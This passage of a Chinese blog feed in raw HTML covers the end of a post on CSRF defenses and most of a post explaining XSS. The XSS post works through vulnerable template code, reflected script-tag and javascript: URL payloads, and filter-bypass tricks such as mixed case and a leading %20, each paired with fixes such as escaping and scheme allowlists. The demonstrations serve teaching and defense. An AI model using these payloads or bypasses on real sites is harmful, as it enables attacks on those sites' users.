title="CSRF监控"></a>CSRF监控</h3><p>对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了CSRF防护措施是很可能的。</p><p>一旦发生了CSRF攻击，我们如何及时的发现这些攻击呢？</p><p>CSRF攻击有着比较明显的特征：</p><ul><li>跨域请求。</li><li>GET类型请求Header的MIME类型大概率为图片，而实际返回Header的MIME类型为Text、JSON、HTML。</li></ul><p>我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有CSRF攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review其CSRF防护策略。</p><h2 id="个人用户CSRF安全的建议"><a href="#个人用户CSRF安全的建议" class="headerlink" title="个人用户CSRF安全的建议"></a>个人用户CSRF安全的建议</h2><p>经常上网的个人用户，可以采用以下方法来保护自己：</p><ul><li>使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。</li><li>尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下上文的防护策略：</p><ul><li>CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。</li><li>CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。</li><li>保证页面的幂等性，后端接口不要在GET页面中做用户操作。</li></ul><p>为了更好的防御CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前Web应用程序自身的情况做合适的选择，才能更好的预防CSRF的发生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>XSS 攻击的介绍</title>
    <link href="http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/"/>
    <id>http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.216Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="XSS-攻击的介绍"><a href="#XSS-攻击的介绍" class="headerlink" title="XSS 攻击的介绍"></a>XSS 攻击的介绍</h2><p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p><ol><li>XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li><li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li></ol><p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p><h3 id="XSS-漏洞的发生和修复"><a href="#XSS-漏洞的发生和修复" class="headerlink" title="XSS 漏洞的发生和修复"></a>XSS 漏洞的发生和修复</h3><p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p><h4 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h4><p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= getParameter(&quot;</span><span class="attr">keyword</span>&quot;) %&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&lt;%= getParameter(&quot;keyword&quot;) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;search?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。</p><blockquote><p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p></blockquote><p>当浏览器请求 <code>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器无法分辨出 <code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p><p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p><p>面对这种情况，我们应该如何进行防范呢？</p><p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p><p>聪明的小明很快找到解决方法，把这个漏洞修复：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span><span class="attr">keyword</span>&quot;)) %&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>escapeHTML()</code> 按照如下规则进行转义：</p><p>|字符|转义后的字符| |-|-| |<code>&amp;</code>|<code>&amp;</code>| |<code>&lt;</code>|<code>&lt;</code>| |<code>&gt;</code>|<code>&gt;</code>| |<code>&quot;</code>|<code>&quot;</code>| |<code>&#39;</code>|<code>&#39;</code>| |<code>/</code>|<code>/</code>|</p><p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#x2F;</span>script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#x2F;</span>script<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p><p><strong>通过这个事件，小明学习到了如下知识：</strong></p><ul><li>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</li><li>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</li><li>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</li><li>通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。</li></ul><h4 id="注意特殊的-HTML-属性、JavaScript-API"><a href="#注意特殊的-HTML-属性、JavaScript-API" class="headerlink" title="注意特殊的 HTML 属性、JavaScript API"></a>注意特殊的 HTML 属性、JavaScript API</h4><p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p><p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p><p>不久，小明又收到安全组的神秘链接：<code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p><p>小明打开对应页面的源码，发现有以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span><span class="attr">redirect_to</span>&quot;)) %&gt;</span>&quot;&gt;跳转...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码，当攻击 URL 为 <code>http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)</code>，服务端响应就成了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(<span class="symbol">&amp;#x27;</span>XSS<span class="symbol">&amp;#x27;</span>)&quot;</span>&gt;</span>跳转...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p><blockquote><p>可恶，又失策了…</p></blockquote><p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p><p>原来不仅仅是特殊字符，连 <code>javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p><p>小明眉头一皱，想到了解决办法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 禁止 URL 以 &quot;javascript:&quot; 开头</span></span><br><span class="line">xss = getParameter(<span class="string">&quot;redirect_to&quot;</span>).startsWith(<span class="string">&#x27;javascript:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!xss) &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="string">&quot;))%&gt;&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;/404&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要 URL 的开头不是 <code>javascript:</code>，就安全了吧？</p><p>安全组随手又扔了一个连接：<code>http://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;)</code></p><blockquote><p>这也能执行？…..好吧，浏览器就是这么强大。</p></blockquote><p>小明欲哭无泪，在判断 URL 开头是否为 <code>javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p><p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;?redirect_to&#x3D;%20javascript:alert(&#39;XSS&#39;)</span><br></pre></td></tr></table></figure><p><code>%20javascript:alert(&#39;XSS&#39;)</code> 经过 URL 解析后变成 <code>javascript:alert(&#39;XSS&#39;)</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p><p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span></span><br><span class="line">allowSchemes = [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>];</span><br><span class="line"></span><br><span class="line">valid = isValid(getParameter(<span class="string">&quot;redirect_to&quot;</span>), allowSchemes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (valid) &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="string">&quot;))%&gt;&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &lt;a href=<span class="string">&quot;/404&quot;</span>&gt;</span><br><span class="line">    跳转...</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个事件，小明学习到了如下知识：</p><ul><li>做了 HTML 转义，并不等于高枕无忧。</li><li>对于链接跳转，如 <code>&lt;a href=&quot;xxx&quot;</code> 或 <code>location.href=&quot;xxx&quot;</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 scheme。</li></ul><h4 id="根据上下文采用不同的转义规则"><a href="#根据上下文采用不同的转义规则" class="headerlink" title="根据上下文采用不同的转义规则"></a>根据上下文采用不同的转义规则</h4><p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> initData = &lt;%= data.toJSON() %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 <code>&quot;</code> 后，JSON 格式会被破坏。</p><p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p><ul><li>当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</li><li>当 JSON 中包含字符串 <code>&lt;/script&gt;</code> 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code>&lt;script&gt;</code> 标签等方法就可以完成注入。</li></ul><p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><p><strong>转义规则如下：</strong></p><p>|字符|转义后的字符| |-|-| |<code>U+2028</code>|<code>\u2028</code>| |<code>U+2029</code>|<code>\u2029</code>| |<code>&lt;</code>|<code>\u003c</code>|</p><p><strong>修复后的代码如下：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt;</span></span><br></pre></td></tr></table></figure><p><strong>通过这个事件，小明学习到了如下知识：</strong></p><ul><li>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</li><li>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</li></ul><h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h3><p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p><ul><li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li><li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li><li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li><li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li><li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li></ul><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p><h2 id="XSS-攻击的分类"><a href="#XSS-攻击的分类" class="headerlink" title="XSS 攻击的分类"></a>XSS 攻击的分类</h2><p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p><h3 id="什么是-XSS"><a href="#什么是-XSS" class="headerlink" title="什么是 XSS"></a>什么是 XSS</h3><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p><p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p><p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p><p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p><ul><li>来自用户的 UGC 信息</li><li>来自第三方的链接</li><li>URL 参数</li><li>POST 参数</li><li>Referer （可能来自不可信的来源）</li><li>Cookie （可能来自其他子域注入）</li></ul><h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><p>|类型|存储区*|插入点*| |-|-| |存储型 XSS|后端数据库|HTML| |反射型 XSS|URL|HTML| |DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|</p><ul><li>存储区：恶意代码存放的位置。</li><li>插入点：由谁取得恶意代码，并插入到网页上。</li></ul><h4 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h4><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><p>反射型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2 id="XSS-攻击的预防"><a href="#XSS-攻击的预防" class="headerlink" title="XSS 攻击的预防"></a>XSS 攻击的预防</h2><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><ol><li>攻击者提交恶意代码。</li><li>浏览器执行恶意代码。</li></ol><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &lt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的“并不确定内容要输出到哪里”有两层含义：</p><ol><li><p>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码( <code>5 &lt; 7</code> )。</p></li><li><p>在前端中，不同的位置所需的编码也不同。</p><ul><li>当 <code>5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">title</span>=<span class="string">&quot;comment&quot;</span>&gt;</span>5 <span class="symbol">&amp;lt;</span> 7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>当 <code>5 &lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</li></ul></li></ol><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p><ul><li>防止 HTML 中出现注入。</li><li>防止 JavaScript 执行时，执行恶意代码。</li></ul><h3 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><ul><li>改成纯前端渲染，把代码和数据分隔开。</li><li>对 HTML 做充分转义。</li></ul><h4 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h4><p>纯前端渲染的过程：</p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h4 id="转义-HTML"><a href="#转义-HTML" class="headerlink" title="转义 HTML"></a>转义 HTML</h4><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#39; /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><p>|XSS 安全漏洞|简单转义是否有防护作用| |-|-| |HTML 标签文字内容|有| |HTML 属性值|有| |CSS 内联样式|无| |内联 JavaScript|无| |内联 JSON|无| |跳转链接|无|</p><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 <a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project">org.owasp.encoder 的官方说明</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 